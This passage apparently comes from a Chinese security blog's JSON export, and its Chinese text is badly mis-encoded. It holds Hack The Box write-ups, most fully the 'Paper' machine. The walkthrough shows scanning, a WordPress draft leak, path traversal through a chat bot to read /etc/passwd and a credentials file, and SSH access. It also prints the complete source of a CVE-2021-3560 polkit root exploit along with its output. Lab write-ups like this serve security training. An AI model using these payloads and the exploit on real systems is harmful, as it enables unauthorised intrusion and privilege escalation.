earlier devbot: test has joined the chat test: file ../../../../root/root.txt CeilingCatStillAThingIn2021? catherine: close devbot: test has left the chat devbot: test stayed on for 1 minute catherine: exit Welcome to the chat. There is one more user devbot: test has joined the chat test: /file ../../../../root/root.txt CeilingCatStillAThingIn2021? [SYSTEM] c2b07bb41d02e2c880a4d1c9469d13ef æˆåŠŸè·å¾—rootæƒé™çš„flagæ–‡ä»¶","categories":[],"tags":[{"name":"Hackthebox","slug":"Hackthebox","permalink":"http://www.lucifiel.com/tags/Hackthebox/"}]},{"title":"Paper - Hackthebox","slug":"Hackthebox - Paper","date":"2022-02-19T11:38:36.000Z","updated":"2023-05-20T02:43:02.000Z","comments":true,"path":"2022/02/19/Hackthebox - Paper/","link":"","permalink":"http://www.lucifiel.com/2022/02/19/Hackthebox%20-%20Paper/","excerpt":"","text":"Hackthebox - Paperé¶åœºä¿¡æ¯ é¶åœºç±»å‹ ä¿¡æ¯æœé›†nmapé¦–å…ˆä½¿ç”¨nmapè¿›è¡Œä¿¡æ¯æœé›† â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop] â””â”€# nmap -sS -A -sC -sV -p- --min-rate 5000 10.10.11.143 Starting Nmap 7.91 ( https://nmap.org ) at 2022-02-18 22:29 EST Nmap scan report for 10.10.11.143 Host is up (0.24s latency). Not shown: 65532 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.0 (protocol 2.0) | ssh-hostkey: | 2048 10:05:ea:50:56:a6:00:cb:1c:9c:93:df:5f:83:e0:64 (RSA) | 256 58:8c:82:1c:c6:63:2a:83:87:5c:2f:2b:4f:4d:c3:79 (ECDSA) |_ 256 31:78:af:d1:3b:c4:2e:9d:60:4e:eb:5d:03:ec:a0:22 (ED25519) 80/tcp open http Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1k mod_fcgid/2.3.9) |_http-generator: HTML Tidy for HTML5 for Linux version 5.7.28 | http-methods: |_ Potentially risky methods: TRACE |_http-server-header: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9 |_http-title: HTTP Server Test Page powered by CentOS 443/tcp open ssl/http Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1k mod_fcgid/2.3.9) |_http-generator: HTML Tidy for HTML5 for Linux version 5.7.28 | http-methods: |_ Potentially risky methods: TRACE |_http-server-header: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9 |_http-title: HTTP Server Test Page powered by CentOS | ssl-cert: Subject: commonName=localhost.localdomain/organizationName=Unspecified/countryName=US | Subject Alternative Name: DNS:localhost.localdomain | Not valid before: 2021-07-03T08:52:34 |_Not valid after: 2022-07-08T10:32:34 |_ssl-date: TLS randomness does not represent time | tls-alpn: |_ http/1.1 No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ). TCP/IP fingerprint: OS:SCAN(V=7.91%E=4%D=2/18%OT=22%CT=1%CU=36529%PV=Y%DS=2%DC=T%G=Y%TM=6210646 OS:8%P=x86_64-pc-linux-gnu)SEQ(SP=106%GCD=1%ISR=10B%TI=Z%CI=Z%II=I%TS=A)OPS OS:(O1=M505ST11NW7%O2=M505ST11NW7%O3=M505NNT11NW7%O4=M505ST11NW7%O5=M505ST1 OS:1NW7%O6=M505ST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7120)ECN OS:(R=Y%DF=Y%T=40%W=7210%O=M505NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F OS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N% OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD OS:=S) Network Distance: 2 hops TRACEROUTE (using port 53/tcp) HOP RTT ADDRESS 1 239.51 ms 10.10.14.1 2 239.64 ms 10.10.11.143 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 56.23 seconds Http æŸ¥çœ‹80ç«¯å£çš„Httpé¡µé¢ï¼Œå‘ç°æ˜¯ä¸€ä¸ªnginxçš„é»˜è®¤é¡µé¢ æš‚æ—¶æ²¡ä»€ä¹ˆå¯çœ‹çš„ï¼Œå»çœ‹çœ‹å“åº”åŒ…å§ åœ¨å“åº”åŒ…ä¸­çœ‹åˆ°äº†ä¸€ä¸ªåŸŸåoffice.htb å»åŠ å…¥åˆ°hostsé‡Œ echo 10.10.11.143 office.paper è®¿é—®åå¯ä»¥çœ‹åˆ°æ˜¯ä¸€ä¸ªwordpressæ­å»ºçš„ ä½¿ç”¨wpscanæ‰«æçœ‹çœ‹ Wpscanâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop] â””â”€# wpscan --url http://office.paper/ _______________________________________________________________ __ _______ _____ \\ \\ / / __ \\ / ____| \\ \\ /\\ / /| |__) | (___ ___ __ _ _ __ Â® \\ \\/ \\/ / | ___/ \\___ \\ / __|/ _` | &#39;_ \\ \\ /\\ / | | ____) | (__| (_| | | | | \\/ \\/ |_| |_____/ \\___|\\__,_|_| |_| WordPress Security Scanner by the WPScan Team Version 3.8.17 Sponsored by Automattic - https://automattic.com/ @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart _______________________________________________________________ [+] URL: http://office.paper/ [10.10.11.143] [+] Started: Fri Feb 18 22:59:11 2022 Interesting Finding(s): [+] Headers | Interesting Entries: | - Server: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9 | - X-Powered-By: PHP/7.2.24 | - X-Backend-Server: office.paper | Found By: Headers (Passive Detection) | Confidence: 100% [+] WordPress readme found: http://office.paper/readme.html | Found By: Direct Access (Aggressive Detection) | Confidence: 100% [+] WordPress version 5.2.3 identified (Insecure, released on 2019-09-05). | Found By: Rss Generator (Passive Detection) | - http://office.paper/index.php/feed/, &lt;generator&gt;https://wordpress.org/?v=5.2.3&lt;/generator&gt; | - http://office.paper/index.php/comments/feed/, &lt;generator&gt;https://wordpress.org/?v=5.2.3&lt;/generator&gt; [+] WordPress theme in use: construction-techup | Location: http://office.paper/wp-content/themes/construction-techup/ | Last Updated: 2021-07-17T00:00:00.000Z | Readme: http://office.paper/wp-content/themes/construction-techup/readme.txt | [!] The version is out of date, the latest version is 1.4 | Style URL: http://office.paper/wp-content/themes/construction-techup/style.css?ver=1.1 | Style Name: Construction Techup | Description: Construction Techup is child theme of Techup a Free WordPress Theme useful for Business, corporate a... | Author: wptexture | Author URI: https://testerwp.com/ | | Found By: Css Style In Homepage (Passive Detection) | | Version: 1.1 (80% confidence) | Found By: Style (Passive Detection) | - http://office.paper/wp-content/themes/construction-techup/style.css?ver=1.1, Match: &#39;Version: 1.1&#39; [+] Enumerating All Plugins (via Passive Methods) [i] No plugins Found. [+] Enumerating Config Backups (via Passive and Aggressive Methods) Checking Config Backups - Time: 00:00:06 &lt;=====================================================================================================================================&gt; (137 / 137) 100.00% Time: 00:00:06 [i] No Config Backups Found. [!] No WPScan API Token given, as a result vulnerability data has not been output. [!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register [+] Finished: Fri Feb 18 22:59:23 2022 [+] Requests Done: 143 [+] Cached Requests: 31 [+] Data Sent: 35.766 KB [+] Data Received: 91.745 KB [+] Memory used: 230.363 MB [+] Elapsed time: 00:00:11 è¿™é‡Œå¯ä»¥çœ‹åˆ°ç‰ˆæœ¬å·æ˜¯Wordpress 5.2.3 å»Googleä¸€ä¸‹æ˜¯å¦æœ‰Exploit https://wpscan.com/vulnerability/3413b879-785f-4c9f-aa8a-5a4a1d5e0ba2 è¿™é‡Œæ‰¾åˆ°ä¸€ä¸ªæœªç»èº«ä»½éªŒè¯æŸ¥çœ‹ä»–äººç§äººå¸–å­çš„æ¼æ´ï¼Œå»ä½¿ç”¨çœ‹çœ‹ http://office.paper/?static=1&amp;order=asc ç›´æ¥ä½¿ç”¨ä¼šæç¤º404ï¼Œå°è¯•æŠŠåé¢&amp;order&#x3D;ascåˆ é™¤è¯•è¯• http://office.paper/?static=1 æˆåŠŸè¯»å–åˆ°ä¸€ç¯‡å¸–å­ï¼ŒæŸ¥çœ‹ä¸€ä¸‹å…¶ä¸­å†…å®¹ test Micheal please remove the secret from drafts for gods sake! Hello employees of Blunder Tiffin, Due to the orders from higher officials, every employee who were added to this blog is removed and they are migrated to our new chat system. So, I kindly request you all to take your discussions from the public blog to a more private chat system. -Nick # Warning for Michael Michael, you have to stop putting secrets in the drafts. It is a huge security issue and you have to stop doing it. -Nick Threat Level Midnight A MOTION PICTURE SCREENPLAY, WRITTEN AND DIRECTED BY MICHAEL SCOTT [INT:DAY] Inside the FBI, Agent Michael Scarn sits with his feet up on his desk. His robotic butler Dwigtâ€¦. # Secret Registration URL of new Employee chat system http://chat.office.paper/register/8qozr226AhkCHZdyY # I am keeping this draft unpublished, as unpublished drafts cannot be accessed by outsiders. I am not that ignorant, Nick. # Also, stop looking at my drafts. Jeez! å…¶ä¸­æåˆ°äº†ä¸€ä¸ªæ–°å‘˜å·¥èŠå¤©ç³»ç»Ÿçš„ç§˜å¯†ç½‘å€ http://chat.office.paper/register/8qozr226AhkCHZdyY æŠŠæ–°ç½‘å€æ·»åŠ åˆ°hostsé‡Œ echo 10.10.11.143 chat.office.paper è¿™é‡Œå¯ä»¥æ³¨å†Œä¸€ä¸ªæ–°ç”¨æˆ· æˆ‘ä»¬å»æ³¨å†Œä¸€ä¸ªå§ æ³¨å†ŒåæˆåŠŸç™»å½•è¿›æ¥ï¼Œå»çœ‹çœ‹æœ‰ä»€ä¹ˆå†…å®¹æ²¡æœ‰ ç¨ç­‰ä¸€ä¼šç„¶åçœ‹åˆ°äº†ä¸€ä¸ªæ–°çš„å†…å®¹ï¼Œå»çœ‹çœ‹ è¿™é‡Œæåˆ°æœ‰äººåœ¨è¯¥é¢‘é“ä¸­æ·»åŠ äº†ä¸€ä¸ªæ–°çš„æœºå™¨äººï¼Œåªéœ€è¦è¾“å…¥recyclops helpæœºå™¨äººå°±ä¼šå‘Šè¯‰ä½ å¯ä»¥åšä»€ä¹ˆ Hello. I am Recyclops. A bot assigned by Dwight. I will have my revenge on earthlings, but before that, I have to help my Cool friend Dwight to respond to the annoying questions asked by his co-workers, so that he may use his valuable time to... well, not interact with his co-workers. Most frequently asked questions include: - What time is it? - What new files are in your sales directory? - Why did the salesman crossed the road? - What&#39;s the content of file x in your sales directory? etc. Please note that I am a beta version and I still have some bugs to be fixed. How to use me ? : 1. Small Talk: You can ask me how dwight&#39;s weekend was, or did he watched the game last night etc. eg: &#39;recyclops how was your weekend?&#39; or &#39;recyclops did you watched the game last night?&#39; or &#39;recyclops what kind of bear is the best? 2. Joke: You can ask me Why the salesman crossed the road. eg: &#39;recyclops why did the salesman crossed the road?&#39; &lt;=====The following two features are for those boneheads, who still don&#39;t know how to use scp. I&#39;m Looking at you Kevin.=====&gt; For security reasons, the access is limited to the Sales folder. 3. Files: eg: &#39;recyclops get me the file test.txt&#39;, or &#39;recyclops could you send me the file src/test.php&#39; or just &#39;recyclops file test.txt&#39; 4. List: You can ask me to list the files 5. Time: You can ask me to what the time is eg: &#39;recyclops what time is it?&#39; or just &#39;recyclops time&#39; ç„¶åæœºå™¨äººç»™å‡ºäº†è‡ªå·±çš„ç”¨æ³• æ¼æ´åˆ©ç”¨ç›®å‰å¯çŸ¥çš„ä¿¡æ¯ æˆ‘ä»¬æœ‰äº†ä¸€ä¸ªå¯ä»¥äº’åŠ¨çš„æœºå™¨äºº recyclops æœºå™¨äººå¯ä»¥å¸®æˆ‘ä»¬è·å¾—æ–‡ä»¶ æˆ‘ä»¬æ— æ³•åœ¨é¢‘é“å†…å‘è¨€ OKï¼Œåˆ°è¿™é‡Œæ€è·¯å°±å¾ˆæ¸…æ™°äº†ï¼Œæˆ‘ä»¬å»æ‰¾æœºå™¨äººç§èŠ è¿™é‡Œè¦æ±‚ä»–è¯»å–test.txtæ–‡ä»¶ å›å¤æ–‡ä»¶&#x2F;home&#x2F;dwight&#x2F;sales&#x2F;test.txtæ–‡ä»¶ä¸å­˜åœ¨ï¼Œå°è¯•ä¸€ä¸‹æ˜¯å¦å¯ä»¥è·¯å¾„ç©¿è¶Š è¿™è¾¹æ„é€ äº†ä¸€ä¸‹è·¯å¾„ï¼ŒæˆåŠŸè·å¾—&#x2F;etc&#x2F;passwdæ–‡ä»¶ root:x:0:0:root:/root:/bin/bash bin:x:1:1:bin:/bin:/sbin/nologin daemon:x:2:2:daemon:/sbin:/sbin/nologin adm:x:3:4:adm:/var/adm:/sbin/nologin lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin sync:x:5:0:sync:/sbin:/bin/sync shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown halt:x:7:0:halt:/sbin:/sbin/halt mail:x:8:12:mail:/var/spool/mail:/sbin/nologin operator:x:11:0:operator:/root:/sbin/nologin games:x:12:100:games:/usr/games:/sbin/nologin ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin nobody:x:65534:65534:Kernel Overflow User:/:/sbin/nologin dbus:x:81:81:System message bus:/:/sbin/nologin systemd-coredump:x:999:997:systemd Core Dumper:/:/sbin/nologin systemd-resolve:x:193:193:systemd Resolver:/:/sbin/nologin tss:x:59:59:Account used by the trousers package to sandbox the tcsd daemon:/dev/null:/sbin/nologin polkitd:x:998:996:User for polkitd:/:/sbin/nologin geoclue:x:997:994:User for geoclue:/var/lib/geoclue:/sbin/nologin rtkit:x:172:172:RealtimeKit:/proc:/sbin/nologin qemu:x:107:107:qemu user:/:/sbin/nologin apache:x:48:48:Apache:/usr/share/httpd:/sbin/nologin cockpit-ws:x:996:993:User for cockpit-ws:/:/sbin/nologin pulse:x:171:171:PulseAudio System Daemon:/var/run/pulse:/sbin/nologin usbmuxd:x:113:113:usbmuxd user:/:/sbin/nologin unbound:x:995:990:Unbound DNS resolver:/etc/unbound:/sbin/nologin rpc:x:32:32:Rpcbind Daemon:/var/lib/rpcbind:/sbin/nologin gluster:x:994:989:GlusterFS daemons:/run/gluster:/sbin/nologin chrony:x:993:987::/var/lib/chrony:/sbin/nologin libstoragemgmt:x:992:986:daemon account for libstoragemgmt:/var/run/lsm:/sbin/nologin saslauth:x:991:76:Saslauthd user:/run/saslauthd:/sbin/nologin dnsmasq:x:985:985:Dnsmasq DHCP and DNS server:/var/lib/dnsmasq:/sbin/nologin radvd:x:75:75:radvd user:/:/sbin/nologin clevis:x:984:983:Clevis Decryption Framework unprivileged user:/var/cache/clevis:/sbin/nologin pegasus:x:66:65:tog-pegasus OpenPegasus WBEM/CIM services:/var/lib/Pegasus:/sbin/nologin sssd:x:983:981:User for sssd:/:/sbin/nologin colord:x:982:980:User for colord:/var/lib/colord:/sbin/nologin rpcuser:x:29:29:RPC Service User:/var/lib/nfs:/sbin/nologin setroubleshoot:x:981:979::/var/lib/setroubleshoot:/sbin/nologin pipewire:x:980:978:PipeWire System Daemon:/var/run/pipewire:/sbin/nologin gdm:x:42:42::/var/lib/gdm:/sbin/nologin gnome-initial-setup:x:979:977::/run/gnome-initial-setup/:/sbin/nologin insights:x:978:976:Red Hat Insights:/var/lib/insights:/sbin/nologin sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin avahi:x:70:70:Avahi mDNS/DNS-SD Stack:/var/run/avahi-daemon:/sbin/nologin tcpdump:x:72:72::/:/sbin/nologin mysql:x:27:27:MySQL Server:/var/lib/mysql:/sbin/nologin nginx:x:977:975:Nginx web server:/var/lib/nginx:/sbin/nologin mongod:x:976:974:mongod:/var/lib/mongo:/bin/false rocketchat:x:1001:1001::/home/rocketchat:/bin/bash dwight:x:1004:1004::/home/dwight:/bin/bash Useræˆ‘ä»¬æŸ¥çœ‹ä¸€ä¸‹å½“å‰æ–‡ä»¶ recyclops list total 0 drwxr-xr-x 4 dwight dwight 32 Jul 3 2021 . drwx------ 11 dwight dwight 334 Feb 18 20:41 .. drwxr-xr-x 2 dwight dwight 27 Sep 15 13:03 sale drwxr-xr-x 2 dwight dwight 27 Jul 3 2021 sale_2 æ²¡ä»€ä¹ˆå¯çœ‹çš„ï¼Œç»§ç»­æŸ¥çœ‹ä¸Šçº§ç›®å½• recyclops list ../ total 788 drwx------ 11 dwight dwight 334 Feb 18 20:41 . drwxr-xr-x. 3 root root 20 Feb 18 23:14 .. lrwxrwxrwx 1 dwight dwight 9 Jul 3 2021 .bash_history -&gt; /dev/null -rw-r--r-- 1 dwight dwight 18 May 10 2019 .bash_logout -rw-r--r-- 1 dwight dwight 141 May 10 2019 .bash_profile -rw-r--r-- 1 dwight dwight 358 Jul 3 2021 .bashrc -rwxr-xr-x 1 dwight dwight 1174 Sep 16 06:58 bot_restart.sh drwx------ 5 dwight dwight 56 Jul 3 2021 .config -rw------- 1 dwight dwight 16 Jul 3 2021 .esd_auth drwx------ 3 dwight dwight 69 Feb 18 22:58 .gnupg drwx------ 8 dwight dwight 4096 Sep 16 07:57 hubot -rw-rw-r-- 1 dwight dwight 18 Sep 16 07:24 .hubot_history -rwxr-xr-x 1 dwight dwight 765818 Feb 18 20:37 linpeas.sh drwx------ 3 dwight dwight 19 Jul 3 2021 .local drwxr-xr-x 4 dwight dwight 39 Jul 3 2021 .mozilla drwxrwxr-x 5 dwight dwight 83 Jul 3 2021 .npm drwxr-xr-x 4 dwight dwight 32 Jul 3 2021 sales drwx------ 2 dwight dwight 6 Sep 16 08:56 .ssh -rw-rw-r-- 1 dwight dwight 2434 Feb 18 20:41 testfile.py -r-------- 1 dwight dwight 33 Feb 18 19:01 user.txt drwxr-xr-x 2 dwight dwight 24 Sep 16 07:09 .vim -rw------- 1 dwight dwight 818 Feb 18 20:41 .viminfo åœ¨è¿™ä¸ªç›®å½•ä¸­ï¼Œæœ‰ä¸€ä¸ªhubotæ–‡ä»¶æˆ‘å¾ˆå¥½å¥‡ï¼Œè¿›å»çœ‹çœ‹ recyclops list ../hubot total 1908 drwx------ 8 dwight dwight 4096 Sep 16 07:57 . drwx------ 11 dwight dwight 334 Feb 18 20:41 .. -rw-r--r-- 1 dwight dwight 0 Jul 3 2021 \\ srwxr-xr-x 1 dwight dwight 0 Jul 3 2021 127.0.0.1:8000 srwxrwxr-x 1 dwight dwight 0 Jul 3 2021 127.0.0.1:8080 drwx--x--x 2 dwight dwight 36 Sep 16 07:34 bin -rw-r--r-- 1 dwight dwight 258 Sep 16 07:57 .env -rwxr-xr-x 1 dwight dwight 2 Jul 3 2021 external-scripts.json drwx------ 8 dwight dwight 163 Jul 3 2021 .git -rw-r--r-- 1 dwight dwight 917 Jul 3 2021 .gitignore -rw-r--r-- 1 dwight dwight 1803113 Feb 18 23:41 .hubot.log -rwxr-xr-x 1 dwight dwight 1068 Jul 3 2021 LICENSE drwxr-xr-x 89 dwight dwight 4096 Jul 3 2021 node_modules drwx--x--x 115 dwight dwight 4096 Jul 3 2021 node_modules_bak -rwxr-xr-x 1 dwight dwight 1062 Sep 16 07:34 package.json -rwxr-xr-x 1 dwight dwight 972 Sep 16 07:26 package.json.bak -rwxr-xr-x 1 dwight dwight 30382 Jul 3 2021 package-lock.json -rwxr-xr-x 1 dwight dwight 14 Jul 3 2021 Procfile -rwxr-xr-x 1 dwight dwight 5044 Jul 3 2021 README.md drwx--x--x 2 dwight dwight 193 Jan 13 10:56 scripts -rwxr-xr-x 1 dwight dwight 100 Jul 3 2021 start_bot.sh drwx------ 2 dwight dwight 25 Jul 3 2021 .vscode -rwxr-xr-x 1 dwight dwight 29951 Jul 3 2021 yarn.lock åœ¨hubotç›®å½•ä¸­ï¼Œæœ‰ä¸€ä¸ª.envæ–‡ä»¶ï¼Œå’±ä»¬æŸ¥çœ‹ä¸€ä¸‹è¿™ä¸ªæ–‡ä»¶ recyclops file ../hubot/.env export ROCKETCHAT_URL=&#39;http://127.0.0.1:48320&#39; export ROCKETCHAT_USER=recyclops export ROCKETCHAT_PASSWORD=Queenofblad3s!23 export ROCKETCHAT_USESSL=false export RESPOND_TO_DM=true export RESPOND_TO_EDITED=true export PORT=8000 export BIND_ADDRESS=127.0.0.1 è¿™é‡Œå¾—åˆ°äº†ä¸€ä¸ªå¯†ç  Queenofblad3s!23 å»ä½¿ç”¨sshç™»å½•è¯•è¯• â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop] â””â”€# ssh dwight@10.10.11.143 The authenticity of host &#39;10.10.11.143 (10.10.11.143)&#39; can&#39;t be established. ECDSA key fingerprint is SHA256:2eiFA8VFQOZukubwDkd24z/kfLkdKlz4wkAa/lRN3Lg. Are you sure you want to continue connecting (yes/no/[fingerprint])? yes Warning: Permanently added &#39;10.10.11.143&#39; (ECDSA) to the list of known hosts. dwight@10.10.11.143&#39;s password: Activate the web console with: systemctl enable --now cockpit.socket Last login: Fri Feb 18 23:58:30 2022 from 10.10.14.56 [dwight@paper ~]$ whoami&amp;&amp;id dwight uid=1004(dwight) gid=1004(dwight) groups=1004(dwight) æˆåŠŸè·å¾—useræƒé™ [dwight@paper ~]$ ls bot_restart.sh hubot linpeas.sh sales testfile.py user.txt [dwight@paper ~]$ cat user.txt 8247362b1baac2f85fd97507b5104341 æˆåŠŸè·å¾—useræƒé™çš„flagæ–‡ä»¶ æƒé™æå‡Rootè¿™é‡Œä½¿ç”¨CVE-2021-3560è¿›è¡Œææƒ import os import sys import time import subprocess import random import pwd print (&quot;**************&quot;) print(&quot;Exploit: Privilege escalation with polkit - CVE-2021-3560&quot;) print(&quot;Exploit code written by Ahmad Almorabea @almorabea&quot;) print(&quot;Original exploit author: Kevin Backhouse &quot;) print(&quot;For more details check this out: https://github.blog/2021-06-10-privilege-escalation-polkit-root-on-linux-with-bug/&quot;) print (&quot;**************&quot;) print(&quot;[+] Starting the Exploit &quot;) time.sleep(3) check = True counter = 0 while check: counter = counter +1 process = subprocess.Popen([&#39;dbus-send&#39;,&#39;--system&#39;,&#39;--dest=org.freedesktop.Accounts&#39;,&#39;--type=method_call&#39;,&#39;--print-reply&#39;,&#39;/org/freedesktop/Accounts&#39;,&#39;org.freedesktop.Accounts.CreateUser&#39;,&#39;string:ahmed&#39;,&#39;string:&quot;Ahmad Almorabea&#39;,&#39;int32:1&#39;]) try: #print(&#39;1 - Running in process&#39;, process.pid) Random = random.uniform(0.006,0.009) process.wait(timeout=Random) process.kill() except subprocess.TimeoutExpired: #print(&#39;Timed out - killing&#39;, process.pid) process.kill() user = subprocess.run([&#39;id&#39;, &#39;ahmed&#39;], stdout=subprocess.PIPE).stdout.decode(&#39;utf-8&#39;) if user.find(&quot;uid&quot;) != -1: print(&quot;[+] User Created with the name of ahmed&quot;) print(&quot;[+] Timed out at: &quot;+str(Random)) check =False break if counter &gt; 2000: print(&quot;[-] Couldn&#39;t add the user, try again it may work&quot;) sys.exit(0) for i in range(200): #print(i) uid = &quot;/org/freedesktop/Accounts/User&quot;+str(pwd.getpwnam(&#39;ahmed&#39;).pw_uid) #In case you need to put a password un-comment the code below and put your password after string:yourpassword&#39; password = &quot;string:&quot; #res = subprocess.run([&#39;openssl&#39;, &#39;passwd&#39;,&#39;-5&#39;,password], stdout=subprocess.PIPE).stdout.decode(&#39;utf-8&#39;) #password = f&quot;string:{res.rstrip()}&quot; process = subprocess.Popen([&#39;dbus-send&#39;,&#39;--system&#39;,&#39;--dest=org.freedesktop.Accounts&#39;,&#39;--type=method_call&#39;,&#39;--print-reply&#39;,uid,&#39;org.freedesktop.Accounts.User.SetPassword&#39;,password,&#39;string:GoldenEye&#39;]) try: #print(&#39;1 - Running in process&#39;, process.pid) Random = random.uniform(0.006,0.009) process.wait(timeout=Random) process.kill() except subprocess.TimeoutExpired: #print(&#39;Timed out - killing&#39;, process.pid) process.kill() print(&quot;[+] Timed out at: &quot; + str(Random)) print(&quot;[+] Exploit Completed, Your new user is &#39;Ahmed&#39; just log into it like, &#39;su ahmed&#39;, and then &#39;sudo su&#39; to root &quot;) p = subprocess.call(&quot;(su ahmed -c &#39;sudo su&#39;)&quot;, shell=True) [dwight@paper ~]$ python3 CVE-2021-3560.py ************** Exploit: Privilege escalation with polkit - CVE-2021-3560 Exploit code written by Ahmad Almorabea @almorabea Original exploit author: Kevin Backhouse For more details check this out: https://github.blog/2021-06-10-privilege-escalation-polkit-root-on-linux-with-bug/ ************** [+] Starting the Exploit id: &#39;ahmed&#39;: no such user id: &#39;ahmed&#39;: no such user id: &#39;ahmed&#39;: no such user id: &#39;ahmed&#39;: no such user id: &#39;ahmed&#39;: no such user id: &#39;ahmed&#39;: no such user id: &#39;ahmed&#39;: no such user id: &#39;ahmed&#39;: no such user id: &#39;ahmed&#39;: no such user [+] User Created with the name of ahmed [+] Timed out at: 0.008836088833898081 ... Error org.freedesktop.DBus.Error.UnknownMethod: No such interface &#39;org.freedesktop.Accounts.User&#39; on object at path /org/freedesktop/Accounts/User1005 Error org.freedesktop.DBus.Error.UnknownMethod: No such interface &#39;org.freedesktop.Accounts.User&#39; on object at path /org/freedesktop/Accounts/User1005 Error org.freedesktop.DBus.Error.UnknownMethod: No such interface &#39;org.freedesktop.Accounts.User&#39; on object at path /org/freedesktop/Accounts/User1005 [+] Timed out at: 0.008945334127711566 [+] Exploit Completed, Your new user is &#39;Ahmed&#39; just log into it like, &#39;su ahmed&#39;, and then &#39;sudo su&#39; to root Password: su: Authentication failure å‡ºç°è¿™ç§å°±æ˜¯æ‰§è¡Œå¤±è´¥ï¼Œåå¤å¤šæ¬¡æ‰§è¡Œï¼Œå‡ºç°ä¸‹åˆ—æç¤ºå°±æ˜¯æˆåŠŸäº† [dwight@paper ~]$ python3 CVE-2021-3560.py ************** Exploit: Privilege escalation with polkit - CVE-2021-3560 Exploit code written by Ahmad Almorabea @almorabea Original exploit author: Kevin Backhouse For more details check this out: https://github.blog/2021-06-10-privilege-escalation-polkit-root-on-linux-with-bug/ ************** [+] Starting the Exploit [+] User Created with the name of ahmed [+] Timed out at: 0.008008275505860037 [+] Timed out at: 0.00782768600159978 [+] Exploit Completed, Your new user is &#39;Ahmed&#39; just log into it like, &#39;su ahmed&#39;, and then &#39;sudo su&#39; to root bash: cannot set terminal process group (118347): Inappropriate ioctl for device bash: no job control in this shell [root@paper dwight]# whoami&amp;&amp;id root uid=0(root) gid=0(root) groups=0(root) æˆåŠŸè·å¾—rootæƒé™ [root@paper dwight]# cd /root [root@paper ~]# ls anaconda-ks.cfg initial-setup-ks.cfg root.txt [root@paper ~]# cat root.txt fb28d8a0b971692ac9726bf448af8497 æˆåŠŸæ‹¿åˆ°rootæƒé™çš„flagæ–‡ä»¶","categories":[],"tags":[{"name":"Hackthebox","slug":"Hackthebox","permalink":"http://www.lucifiel.com/tags/Hackthebox/"}]},{"title":"Bolt - Hackthebox","slug":"Hackthebox - Bolt","date":"2022-01-17T11:38:36.000Z","updated":"2023-05-20T01:24:51.000Z","comments":true,"path":"2022/01/17/Hackthebox - Bolt/","link":"","permalink":"http://www.lucifiel.com/2022/01/17/Hackthebox%20-%20Bolt/","excerpt":"","text":"Hackthebox - Bolté¶åœºä¿¡æ¯ é¶åœºç±»å‹ ä¿¡æ¯æœé›†é¦–å…ˆä½¿ç”¨nmapè¿›è¡Œç«¯å£æ‰«æ â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop] â””â”€# nmap -sS -A -sC -sV -p- --min-rate 5000 10.10.11.114 Starting Nmap 7.91 ( https://nmap.org ) at 2022-01-04 20:07 EST Warning: 10.10.11.114 giving up on port because retransmission cap hit (10). Nmap scan report for bogon (10.10.11.114) Host is up (0.26s latency). Not shown: 65527 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 4d:20:8a:b2:c2:8c:f5:3e:be:d2:e8:18:16:28:6e:8e (RSA) | 256 7b:0e:c7:5f:5a:4c:7a:11:7f:dd:58:5a:17:2f:cd:ea (ECDSA) |_ 256 a7:22:4e:45:19:8e:7d:3c:bc:df:6e:1d:6c:4f:41:56 (ED25519) 80/tcp open http nginx 1.18.0 (Ubuntu) |_http-server-header: nginx/1.18.0 (Ubuntu) |_http-title: Starter Website - About 443/tcp open ssl/http nginx 1.18.0 (Ubuntu) |_http-server-header: nginx/1.18.0 (Ubuntu) | ssl-cert: Subject: commonName=passbolt.bolt.htb/organizationName=Internet Widgits Pty Ltd/stateOrProvinceName=Some-State/countryName=AU | Not valid before: 2021-02-24T19:11:23 |_Not valid after: 2022-02-24T19:11:23 15062/tcp filtered unknown 17825/tcp filtered unknown 37303/tcp filtered unknown 40042/tcp filtered unknown 63830/tcp filtered unknown No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ). TCP/IP fingerprint: OS:SCAN(V=7.91%E=4%D=1/4%OT=22%CT=1%CU=33320%PV=Y%DS=2%DC=T%G=Y%TM=61D4F026 OS:%P=x86_64-pc-linux-gnu)SEQ(SP=102%GCD=1%ISR=109%TI=Z%CI=Z%II=I%TS=A)OPS( OS:O1=M505ST11NW7%O2=M505ST11NW7%O3=M505NNT11NW7%O4=M505ST11NW7%O5=M505ST11 OS:NW7%O6=M505ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN( 